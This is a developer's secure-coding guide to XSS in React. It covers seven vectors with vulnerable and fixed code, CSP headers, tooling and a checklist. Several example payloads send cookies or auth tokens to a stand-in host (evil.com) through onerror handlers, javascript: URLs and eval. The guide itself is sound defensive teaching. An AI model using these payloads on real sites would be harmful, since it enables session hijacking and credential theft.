# XSS Security in React

A developer's reference for understanding, identifying, and preventing Cross-Site Scripting (XSS) vulnerabilities in React applications. Covers every attack vector with wrong/right code examples, tooling, and a pre-commit checklist.

---

## Table of Contents

1. [What is XSS?](#1-what-is-xss)
2. [How React protects you by default](#2-how-react-protects-you-by-default)
3. [Vector 1 — dangerouslySetInnerHTML](#3-vector-1--dangerouslysetinnerhtml)
4. [Vector 2 — unsafe href / src URLs](#4-vector-2--unsafe-href--src-urls)
5. [Vector 3 — direct DOM manipulation via refs](#5-vector-3--direct-dom-manipulation-via-refs)
6. [Vector 4 — eval and dynamic code execution](#6-vector-4--eval-and-dynamic-code-execution)
7. [Vector 5 — SSR data injection](#7-vector-5--ssr-data-injection)
8. [Vector 6 — third-party components rendering HTML](#8-vector-6--third-party-components-rendering-html)
9. [Vector 7 — dynamic component tags from user input](#9-vector-7--dynamic-component-tags-from-user-input)
10. [Defence in depth — Content Security Policy](#10-defence-in-depth--content-security-policy)
11. [Recommended tooling](#11-recommended-tooling)
12. [XSS pre-commit checklist](#12-xss-pre-commit-checklist)

---

## 1. What is XSS?

**Cross-Site Scripting (XSS)** is an injection attack where an attacker gets malicious script to execute in another user's browser — under your site's origin. Once running, that script can:

- Steal session cookies and auth tokens
- Read and exfiltrate form data (passwords, credit cards)
- Hijack the user's session and act on their behalf
- Deface the page or redirect to a phishing site
- Install a keylogger

### Three types of XSS

| Type | How it works | Example |
|------|-------------|---------|
| **Stored** | Malicious script saved in the database, served to every visitor | A comment containing `<script>` tags |
| **Reflected** | Script embedded in a URL, server reflects it back in the response | `https://site.com/search?q=<script>...` |
| **DOM-based** | Client-side JS reads attacker-controlled data and writes it to the DOM | `div.innerHTML = location.hash` |

React apps are most exposed to **DOM-based XSS** — the attack happens entirely in the browser.

---

## 2. How React protects you by default

React escapes all string values rendered through JSX before they reach the DOM. This makes the most naive XSS attempt harmless:

```tsx
const userInput = '<script>alert(document.cookie)</script>';

// React converts this to the escaped text string — no script executes
return <div>{userInput}</div>;
// Renders as: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
```

**React's escaping covers:**
- JSX expressions: `{value}`
- String props: `<div className={value}>`
- Children: `<p>{children}</p>`

**React's escaping does NOT cover:**
- `dangerouslySetInnerHTML` — bypasses escaping by design
- `href`, `src`, `action` with `javascript:` URLs — not escaped
- Direct DOM access via `ref.current.innerHTML`
- Any code path that touches the DOM outside of React's render tree

The sections below cover each unprotected surface.

---

## 3. Vector 1 — dangerouslySetInnerHTML

### Risk level: High

The most common React XSS vector. React deliberately named this prop to signal danger. It instructs React to set the element's `innerHTML` directly — bypassing all escaping.

### The attack

```tsx
// Attacker submits this as their "bio":
// Hello! <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

// ❌ Wrong — renders the attacker's payload as live HTML
const UserBio = ({ bio }: { bio: string }) => (
  <div dangerouslySetInnerHTML={{ __html: bio }} />
);
```

When this renders, the browser executes the `onerror` handler and sends the victim's cookies to the attacker's server.

### The fix

```tsx
import DOMPurify from 'dompurify';

// ✅ Right — strip all executable content before rendering
const UserBio = ({ bio }: { bio: string }) => (
  <div
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(bio, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href', 'title', 'target'],
      }),
    }}
  />
);
```

### Even better — avoid it entirely

```tsx
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';

// ✅ Best — render user content as markdown, never raw HTML
const UserBio = ({ bio }: { bio: string }) => (
  <ReactMarkdown remarkPlugins={[remarkGfm]}>{bio}</ReactMarkdown>
);
```

> **DOMPurify configuration tip:** Always explicitly set `ALLOWED_TAGS` and `ALLOWED_ATTR`. The default allowlist is broad — restrict it to only what your UI actually needs.

---

## 4. Vector 2 — unsafe href / src URLs

### Risk level: High

React does not block `javascript:` pseudo-URLs in `href`, `src`, `action`, or `formAction`. An attacker who controls a URL can inject executable script that runs when the user clicks or when an image loads.

### The attack

```tsx
// Attacker provides this as their "website":
// javascript:fetch('https://evil.com/?t='+localStorage.getItem('authToken'))

// ❌ Wrong — clicking this link executes the script
const ProfileLink = ({ url }: { url: string }) => (
  <a href={url}>Visit my website</a>
);

// Also dangerous in image src:
// data:text/html,<script>...</script>
const Avatar = ({ src }: { src: string }) => (
  <img src={src} alt="avatar" />
);
```

### The fix

```tsx
// ✅ Right — validate protocol with URL() before rendering
const isSafeUrl = (url: string): boolean => {
  try {
    const { protocol } = new URL(url);
    return protocol === 'https:' || protocol === 'http:';
  } catch {
    return false; // invalid URL — treat as unsafe
  }
};

const ProfileLink = ({ url }: { url: string }) => {
  if (!isSafeUrl(url)) return <span>Invalid URL</span>;
  return (
    <a href={url} target="_blank" rel="noopener noreferrer">
      Visit my website
    </a>
  );
};
```

### Safe URL utility (reusable)

```tsx
// utils/url.ts
const SAFE_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);

export const sanitizeUrl = (url: string): string | null => {
  try {
    const parsed = new URL(url);
    return SAFE_PROTOCOLS.has(parsed.protocol) ? url : null;
  } catch {
    return null;
  }
};

// Usage
const safeHref = sanitizeUrl(userUrl);
{safeHref && <a href={safeHref}>Link</a>}
```

> **Don't forget `rel="noopener noreferrer"`** on all `target="_blank"` links — without it, the opened page can access your page via `window.opener`.

---

## 5. Vector 3 — direct DOM manipulation via refs

### Risk level: High

Using a ref to set `innerHTML` directly bypasses React's rendering pipeline and all its escaping. This is DOM-based XSS.

### The attack

```tsx
// ❌ Wrong — equivalent to dangerouslySetInnerHTML but less obvious
const RichContent = ({ content }: { content: string }) => {
  const ref = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (ref.current) {
      ref.current.innerHTML = content; // ← XSS here
    }
  }, [content]);

  return <div ref={ref} />;
};
```

### The fix

```tsx
import DOMPurify from 'dompurify';

// ✅ Right — sanitize before any innerHTML assignment
useEffect(() => {
  if (ref.current) {
    ref.current.innerHTML = DOMPurify.sanitize(content);
  }
}, [content]);

// ✅ Better — use React state to drive rendering, avoid innerHTML entirely
const RichContent = ({ content }: { content: string }) => (
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} />
);

// ✅ Best — avoid raw HTML rendering altogether
const RichContent = ({ content }: { content: string }) => (
  <ReactMarkdown>{content}</ReactMarkdown>
);
```

> **Other dangerous DOM properties:** `document.write()`, `element.outerHTML`, `insertAdjacentHTML()` — treat all of these the same way as `innerHTML`.

---

## 6. Vector 4 — eval and dynamic code execution

### Risk level: Critical

These APIs execute arbitrary strings as JavaScript. There is no safe way to use them with user-supplied data.

### The attack

```tsx
// Attacker input: "fetch('https://evil.com/?c='+document.cookie)"

// ❌ Wrong — directly executes attacker's code
const runFormula = (expression: string) => {
  return eval(expression);
};

// ❌ Also wrong — same risk, different syntax
const fn = new Function('return ' + userExpression);
fn();

// ❌ String form of setTimeout/setInterval is also eval
setTimeout(userInput, 1000);
setInterval(userInput, 1000);
```

### The fix

```tsx
// ✅ Right — use a safe math expression parser
import { evaluate } from 'mathjs';

const runFormula = (expression: string): number => {
  try {
    const result = evaluate(expression); // sandboxed, no DOM access
    if (typeof result !== 'number') throw new Error('Non-numeric result');
    return result;
  } catch {
    throw new Error('Invalid expression');
  }
};

// ✅ Right — always use function form of setTimeout
setTimeout(() => doSomething(), 1000); // never pass a string
```

> **Rule:** If you find yourself reaching for `eval`, there is always a better approach — a parser library, a lookup table, or a different architecture.

---

## 7. Vector 5 — SSR data injection

### Risk level: High

In server-side rendering (Next.js, Remix, custom SSR), it is common to serialize server data into a `<script>` tag so the client can hydrate without a second fetch. If done naively, the data can break out of the script context.

### The attack

```tsx
// Attacker's username: "</script><script>alert(document.cookie)</script>"

// ❌ Wrong — JSON.stringify does NOT escape </script> sequences
export const getServerSideProps = async () => {
  const user = await fetchUser(); // attacker controls user.name
  return { props: { user } };
};

// In _document.tsx:
<script
  dangerouslySetInnerHTML={{
    __html: `window.__USER__ = ${JSON.stringify(user)}`,
    //       ↑ if user.name contains </script>, the tag closes early
  }}
/>
```

The browser sees `</script>` in the middle of the tag and ends the script block, then parses the rest as HTML — executing the injected script.

### The fix

```tsx
import serialize from 'serialize-javascript';

// ✅ Right — serialize-javascript escapes </script>, Unicode line terminators,
//           and other dangerous sequences that JSON.stringify misses
<script
  dangerouslySetInnerHTML={{
    __html: `window.__USER__ = ${serialize(user, { isJSON: true })}`,
  }}
/>
```

### Next.js App Router pattern

```tsx
// ✅ Right — pass data through props/RSC, avoid inline scripts entirely
// app/page.tsx (Server Component)
export default async function Page() {
  const user = await fetchUser();
  return <ClientComponent initialUser={user} />;
  // Next.js serializes this safely through its own mechanism
}
```

---

## 8. Vector 6 — third-party components rendering HTML

### Risk level: Medium

Libraries like rich text editors, tooltip components, and charting tools often accept HTML strings via props and render them as `innerHTML` internally. Passing unsanitized user data to these props is XSS even if your own code looks clean.

### The attack

```tsx
// Attacker's bio: '<b onmouseover="stealCookies()">Hover me</b>'

// ❌ Wrong — TooltipLib renders content as innerHTML internally
import { Tooltip } from 'some-tooltip-lib';
<Tooltip content={userBio} />

// ❌ Wrong — many rich text viewers accept raw HTML
import { RichTextViewer } from 'some-editor-lib';
<RichTextViewer value={userContent} />
```

### The fix

```tsx
import DOMPurify from 'dompurify';

// ✅ Right — sanitize before passing to any third-party HTML prop
<Tooltip content={DOMPurify.sanitize(userBio)} />
<RichTextViewer value={DOMPurify.sanitize(userContent)} />
```

### How to audit third-party libraries

```bash
# Check if a library uses innerHTML anywhere in its source
grep -r "innerHTML" node_modules/some-library/dist/

# Check the library's security policy / known CVEs
npm audit
```

> **Best practice:** Before using a third-party component that accepts user-generated content, read its documentation to confirm whether props are rendered as text or HTML. When in doubt, sanitize.

---

## 9. Vector 7 — dynamic component tags from user input

### Risk level: Medium

React allows you to use a variable as a JSX tag. If that variable comes from user input, an attacker can inject `script`, `iframe`, or other dangerous elements.

### The attack

```tsx
// Attacker provides: "script" as the heading level

// ❌ Wrong — renders <script>children</script>
const DynamicHeading = ({ tag, children }: { tag: string; children: string }) => {
  const Tag = tag; // if tag = "script", this is XSS
  return <Tag>{children}</Tag>;
};
```

### The fix

```tsx
// ✅ Right — whitelist the allowed tags
const ALLOWED_HEADING_TAGS = ['h1', 'h2', 'h3', 'h4', 'p', 'span'] as const;
type HeadingTag = typeof ALLOWED_HEADING_TAGS[number];

const DynamicHeading = ({
  tag,
  children,
}: {
  tag: string;
  children: string;
}) => {
  const safeTag: HeadingTag = ALLOWED_HEADING_TAGS.includes(tag as HeadingTag)
    ? (tag as HeadingTag)
    : 'p'; // fallback to a safe default

  const Tag = safeTag;
  return <Tag>{children}</Tag>;
};
```

---

## 10. Defence in depth — Content Security Policy

A **Content Security Policy (CSP)** is an HTTP header that tells the browser which scripts, styles, and other resources are allowed to load. Even if an XSS payload gets injected, a strict CSP prevents it from executing.

### Example CSP header (Next.js)

```tsx
// next.config.js
const cspHeader = `
  default-src 'self';
  script-src 'self' 'nonce-{NONCE}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
`.replace(/\n/g, '');

module.exports = {
  async headers() {
    return [
      {
        source: '/(.*)',
        headers: [{ key: 'Content-Security-Policy', value: cspHeader }],
      },
    ];
  },
};
```

### Other security headers to add

```tsx
{ key: 'X-Content-Type-Options',    value: 'nosniff' },
{ key: 'X-Frame-Options',           value: 'DENY' },
{ key: 'Referrer-Policy',           value: 'strict-origin-when-cross-origin' },
{ key: 'Permissions-Policy',        value: 'camera=(), microphone=(), geolocation=()' },
```

### CSP key directives explained

| Directive | What it controls |
|-----------|-----------------|
| `default-src 'self'` | Fallback — only load resources from your own origin |
| `script-src 'self'` | Only execute scripts from your origin (blocks inline scripts) |
| `object-src 'none'` | Block Flash, Java plugins entirely |
| `base-uri 'self'` | Prevent `<base>` tag injection attacks |
| `frame-ancestors 'none'` | Prevent your page being embedded in iframes (clickjacking) |
| `upgrade-insecure-requests` | Force HTTP resources to load over HTTPS |

> **CSP is a last line of defence**, not a replacement for sanitizing inputs. Use both.

---

## 11. Recommended tooling

| Package | Purpose | Install |
|---------|---------|---------|
| `dompurify` | Sanitize HTML strings — strip XSS payloads | `npm i dompurify` + `npm i -D @types/dompurify` |
| `serialize-javascript` | Safe server-to-client data serialization in SSR `<script>` tags | `npm i serialize-javascript` |
| `react-markdown` | Render user markdown safely without raw HTML | `npm i react-markdown remark-gfm` |
| `mathjs` | Safe sandboxed math expression evaluator (replaces eval) | `npm i mathjs` |
| `helmet` | Sets security headers automatically in Express/Node SSR | `npm i helmet` |
| `eslint-plugin-no-unsanitized` | ESLint rule that flags raw innerHTML assignments | `npm i -D eslint-plugin-no-unsanitized` |

### ESLint config to catch XSS patterns

```json
// .eslintrc.json
{
  "plugins": ["no-unsanitized"],
  "rules": {
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error",
    "no-eval": "error"
  }
}
```

---

## 12. XSS pre-commit checklist

Run through this before every PR that touches user-generated content.

### dangerouslySetInnerHTML
- [ ] Every use of `dangerouslySetInnerHTML` passes through `DOMPurify.sanitize()`
- [ ] `ALLOWED_TAGS` and `ALLOWED_ATTR` are explicitly restricted, not left to defaults
- [ ] Consider replacing with `react-markdown` or a text-only render

### URLs
- [ ] Every `href`, `src`, `action`, or `formAction` that comes from user input is validated with `new URL()` protocol check
- [ ] All `target="_blank"` links have `rel="noopener noreferrer"`
- [ ] No `javascript:` or `data:` URLs are passed to DOM attributes

### DOM access
- [ ] No `ref.current.innerHTML =` without `DOMPurify.sanitize()`
- [ ] No `document.write()`, `insertAdjacentHTML()`, or `outerHTML =` with user data
- [ ] No `eval()`, `new Function()`, or string-form `setTimeout`/`setInterval`

### SSR
- [ ] Server-to-client data in `<script>` tags uses `serialize-javascript`, not `JSON.stringify`
- [ ] Prefer RSC/prop-based data passing over inline script injection

### Third-party libraries
- [ ] Any third-party prop that renders HTML receives sanitized input
- [ ] `npm audit` passes with no high/critical vulnerabilities

### Dynamic components
- [ ] Any variable used as a JSX tag is validated against a whitelist of safe HTML elements

### Headers
- [ ] `Content-Security-Policy` header is configured and tested
- [ ] `X-Content-Type-Options: nosniff` is set
- [ ] `X-Frame-Options: DENY` is set

---

## Quick reference — all vectors at a glance

| # | Vector | Severity | Prevention |
|---|--------|----------|------------|
| 1 | `dangerouslySetInnerHTML` with raw user HTML | 🔴 High | `DOMPurify.sanitize()` or `react-markdown` |
| 2 | `href`/`src` with `javascript:` URLs | 🔴 High | Validate protocol with `new URL()` |
| 3 | `ref.current.innerHTML = userInput` | 🔴 High | `DOMPurify.sanitize()` before assignment |
| 4 | `eval` / `new Function` / string `setTimeout` | 🔴 Critical | Never use with user data; use a parser library |
| 5 | SSR `JSON.stringify` in `<script>` tags | 🔴 High | `serialize-javascript` |
| 6 | Third-party HTML props | 🟡 Medium | Sanitize before passing to any HTML-rendering prop |
| 7 | Dynamic JSX tag from user input | 🟡 Medium | Whitelist allowed element names |
| — | No CSP header | 🟡 Medium | Configure CSP as last-line defence |

---

*This document is a living reference. Open a PR to suggest additions or corrections.*
